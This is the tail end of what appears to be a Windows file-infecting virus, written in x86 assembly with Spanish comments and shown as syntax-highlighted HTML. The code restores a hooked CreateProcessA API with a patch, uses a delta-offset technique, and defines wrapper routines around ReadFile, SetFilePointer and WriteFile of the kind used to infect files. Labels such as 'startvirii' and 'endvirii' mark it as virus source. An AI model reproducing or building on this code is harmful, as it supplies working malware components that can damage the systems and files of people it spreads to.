          </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta3</span><span class="sc0">

          </span><span class="sc6">pushad</span><span class="sc0">
        
          </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PARCHE</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newCreateProcessA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;pongo otra vez</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">                                </span><span class="sc1">;el parche                                   ;del api</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc6">popad</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">   </span><span class="sc1">;opcode de un push</span><span class="sc0">
</span><span class="sc5">dirretorno</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">lectura</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;Llamada al api ReadFile</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;En ecx: Numero de bytes a leer</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">IOBYTES</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;En edx: el offset del buffer        </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ahand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newReadFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">moverpuntero</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">;Llamada al api SetFilePointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;en edx: el offset del archivo              </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ahand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newSetFilePointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">escritura</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;Llamada al api WriteFile</span><span class="sc0">
                                           </span><span class="sc1">;en ecx: bytes a escribir</span><span class="sc0">
                                           </span><span class="sc1">;en edx: offset del buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IOBYTES</span><span class="sc4">]</span><span class="sc0">             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ahand</span><span class="sc4">]</span><span class="sc0">       
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newWriteFile</span><span class="sc4">]</span><span class="sc0">    
</span><span class="sc5">jur</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">endhook</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">endvirii</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">   </span><span class="sc5">startvirii</span><span class="sc0">



 
 
</span></div></body>
</html>
